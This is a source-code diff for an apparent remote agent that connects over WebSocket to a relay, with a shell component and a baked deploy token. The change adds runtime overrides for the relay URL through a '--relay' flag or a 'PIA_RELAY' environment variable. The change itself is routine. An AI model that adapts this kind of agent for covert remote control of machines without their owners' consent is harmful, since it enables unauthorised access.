@@ -2,6 +2,7 @@
 #include "runtime.h"
 #include "websocket_client.h"
 #include "shell.h"
+#include "platform/system/environment.h"
 
 static const CHAR *CommandTypeName(UINT8 type)
 {
@@ -65,7 +66,28 @@ static void SleepMs(UINT32 ms)
 
 INT32 start()
 {
-    const CHAR url[] = AGENT_RELAY_URL;
+    // Resolve relay URL: command line (--relay) > env var (PIA_RELAY) > baked AGENT_RELAY_URL.
+    // The baked default is the Epic 1 deploy model (RELAY_URL baked at build via CMake);
+    // --relay / PIA_RELAY let an operator override it at runtime without rebuilding.
+    [[maybe_unused]] const CHAR *url;  // for logging (%s); only read in AGENT_VERBOSE_LOG builds
+    Span<const CHAR> urlSpan;      // for WebSocketClient::Create (takes Span, not a raw pointer)
+    CHAR urlBuf[512];
+    USIZE len = Environment::GetCommandLineValue("--relay", Span<CHAR>(urlBuf, sizeof(urlBuf)));
+    if (len == 0)
+        len = Environment::GetVariable("PIA_RELAY", Span<CHAR>(urlBuf, sizeof(urlBuf)));
+    if (len > 0)
+    {
+        url = urlBuf;
+        urlSpan = Span<const CHAR>(urlBuf, len);
+#ifdef AGENT_VERBOSE_LOG
+        LOG_INFO("Relay URL (override): %s", (PCCHAR)url);
+#endif
+    }
+    else
+    {
+        url = AGENT_RELAY_URL;  // baked fallback (Epic 1 deploy)
+        urlSpan = Span<const CHAR>(AGENT_RELAY_URL);
+    }
     const CHAR deployToken[] = AGENT_DEPLOY_TOKEN;
 
     Context context;
@@ -94,7 +116,7 @@ INT32 start()
         LOG_INFO("Connection attempt #%u", connectionAttempt);
 #endif
 
-        auto createResult = WebSocketClient::Create(url, deployToken);
+        auto createResult = WebSocketClient::Create(urlSpan, deployToken);
         if (!createResult)
         {
 #ifdef AGENT_VERBOSE_LOG
